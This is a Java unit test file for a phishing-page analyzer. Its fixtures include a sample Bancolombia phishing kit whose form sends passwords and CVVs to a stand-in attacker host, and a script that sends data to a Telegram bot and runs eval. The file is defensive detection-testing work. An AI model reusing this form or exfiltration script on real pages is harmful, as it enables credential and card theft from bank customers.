package com.phishware.service;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;

@DisplayName("WebContentAnalyzer - Análisis de contenido HTML")
class WebContentAnalyzerTest {

    private final WebContentAnalyzer analyzer = new WebContentAnalyzer(null);

    private WebContentAnalyzer.ContentAnalysisResult analyze(String url, String html) {
        SafePageFetcher.FetchResult fetch = new SafePageFetcher.FetchResult(
            url, url, List.of(url), 200, "text/html", "", html.getBytes(), false, null, null);
        Document doc = Jsoup.parse(html, url);
        return analyzer.analyzeDocument(doc, fetch);
    }

    private boolean has(WebContentAnalyzer.ContentAnalysisResult r, String type) {
        return r.indicators().stream().anyMatch(i -> i.type().equals(type));
    }

    @Test
    @DisplayName("Detecta un kit de phishing que suplanta a una marca y exfiltra por Telegram")
    void detectsPhishingKit() {
        String html = """
            <html><head><title>Bancolombia - Sucursal Virtual Personas</title></head>
            <body oncontextmenu="return false">
              <img src="https://www.bancolombia.com/logo.png" alt="Bancolombia">
              <p>Su cuenta ha sido suspendida por actividad inusual. Verifique su identidad dentro de 24 horas.</p>
              <form action="https://collector.evil-host.ru/save.php" method="post">
                <input name="usuario"><input type="password" name="clave">
                <input name="cvv" placeholder="CVV">
              </form>
              <a href="#">Ayuda</a><a href="#">Seguridad</a><a href="#">Contacto</a>
              <a href="javascript:void(0)">Olvidé mi clave</a><a href="#">Términos</a>
              <script>fetch("https://api.telegram.org/bot123:ABC/sendMessage?chat_id=1&text="+atob(x));eval(y)</script>
            </body></html>
            """;
        WebContentAnalyzer.ContentAnalysisResult r = analyze("https://bancolombia-personas.online/login", html);

        assertThat(r.available()).isTrue();
        assertThat(has(r, "BRAND_IMPERSONATION")).isTrue();
        assertThat(has(r, "FORM_EXTERNAL_ACTION")).isTrue();
        assertThat(has(r, "DATA_EXFILTRATION")).isTrue();
        assertThat(has(r, "URGENCY_LANGUAGE")).isTrue();
        assertThat(has(r, "NULL_LINKS")).isTrue();
        assertThat(has(r, "SENSITIVE_DATA_REQUEST")).isTrue();
        assertThat(has(r, "OBFUSCATED_SCRIPT")).isTrue();
        assertThat(r.score()).isEqualTo(100.0);
    }

    @Test
    @DisplayName("Un login legítimo en su dominio oficial no genera señales graves")
    void legitimateLoginIsClean() {
        String html = """
            <html><head><title>Iniciar sesión - PayPal</title></head><body>
              <form action="/signin" method="post"><input name="email"><input type="password" name="pw"></form>
              <a href="/help">Ayuda</a><a href="/privacy">Privacidad</a><a href="/legal">Legal</a>
              <a href="/signup">Crear cuenta</a><a href="https://www.paypal.com/es/home">Inicio</a>
            </body></html>
            """;
        WebContentAnalyzer.ContentAnalysisResult r = analyze("https://www.paypal.com/signin", html);

        assertThat(r.indicators()).isEmpty();
        assertThat(r.score()).isZero();
    }

    @Test
    @DisplayName("Detecta credenciales sobre HTTP, iframes ocultos y meta refresh a otro dominio")
    void detectsInsecureAndRedirects() {
        String html = """
            <html><head><meta http-equiv="refresh" content="5; url=https://otro-sitio.click/x"></head><body>
              <iframe src="https://ads.example" width="0" height="0"></iframe>
              <form><input type="password" name="p"></form>
            </body></html>
            """;
        WebContentAnalyzer.ContentAnalysisResult r = analyze("http://portal-empleados.example.com/", html);

        assertThat(has(r, "CREDENTIALS_OVER_HTTP")).isTrue();
        assertThat(has(r, "HIDDEN_IFRAME")).isTrue();
        assertThat(has(r, "AUTO_REDIRECT")).isTrue();
    }
}
